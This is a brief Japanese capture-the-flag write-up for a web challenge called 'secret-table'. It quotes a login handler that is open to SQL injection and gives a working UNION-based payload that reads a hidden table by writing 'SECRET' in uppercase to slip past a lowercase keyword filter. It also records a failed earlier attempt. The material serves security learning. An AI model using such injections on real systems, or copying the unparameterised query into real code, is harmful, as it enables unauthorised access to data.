# secret-table
*TOPIC: SQL　　*GENRE: Web　　 *LEVEL: midium  
--
## 問題概要
```
脆弱性があるって？でも秘密のテーブルにはアクセスできないはず...
```　　

## 解法  
- 表を結合する
	-該当コード
	```python
	for value in [username, password]:
		if "secret" in value:
			return "The table is secret!"
	query = (
        f"SELECT * FROM users WHERE username='{username}' AND password='{password}';"
    )
	error = None
	try:
		user = conn.execute(query).fetchone()
	except sqlite3.Error as e:
		user = None
		error = str(e)
	conn.close()

	if error:
		return f"SQL error: {error}"
	
	if user is None:
		return "invaild credentials"
	
	return f"Hello, {user[0]}!"
	```
	- secretという文字は使えないので，"SECRET"で代用する ←writeup参照　自力で解こうとした際には，(SELECT "sec"||"ret")のサブクエリでいけないか試していた．
	- userテーブルとsecretテーブルを結合するため，passwordの欄に次のような文を入力
	```sql
	' UNION select flag ,'' from SECRET --
	```
    これによってフラグを入手できた。← writeup参照 自力で解こうとした際は，
	```sql
	'UNION SELECT flag, 'x' FROM (SELECT "s"||"e"||"c"||"r"||"e"||"t")--
	```
	と入力したが，no such column: flagとなり，フラグの出力はできなかった．
	### 自力で到達できたところ
	- UNIONを用いて表を結合すること
	### できなかったところ
	- WAFが大文字に対応していない点
	- UNIONの理解